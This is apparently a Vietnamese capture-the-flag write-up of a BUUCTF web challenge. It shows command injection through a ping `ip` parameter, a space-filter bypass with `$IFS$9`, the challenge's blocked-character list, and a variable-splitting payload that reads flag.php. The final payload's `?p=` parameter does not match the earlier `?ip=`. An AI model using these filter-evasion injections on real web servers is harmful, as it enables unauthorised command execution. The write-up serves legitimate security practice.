Ta có form challenge như sau

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/855cf10a-1993-4e98-924e-8e2505a26238)

Ta thấy bài có ghi `/?ip=`, nên mình sẽ thử chèn url như sau `/?ip=127.0.0.1;ls`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/0ecc1050-f686-4d99-8d67-179b8e7c01f6)

Vậy là ta có thể nhận ra bài này là command execution.Thử vào file `index.php` trước.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/28ffe77c-ed7c-4fa0-a7e0-da401c80218d)

Dã bị filter dấu cách nên mình sử dụng `$IFS$9` thay thế

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/c15f2426-b5b3-400f-ab5b-978ecaccfdcf)

Ta thấy các ký tự `&, /, ?, *, <, x{00}-, \x{1f}, ', ", \, (), [], {}, "xxxfxxxlxxxaxxxgxxx", "", "bash",flag`

Mình có đọc các wu khác thì hướng dẫn theo gán các biến và đảo lộn. Ta có payload như sau `/?p=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php`

Lụm key

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/1cbd893c-aa9a-46e3-862e-f384b6d61001)



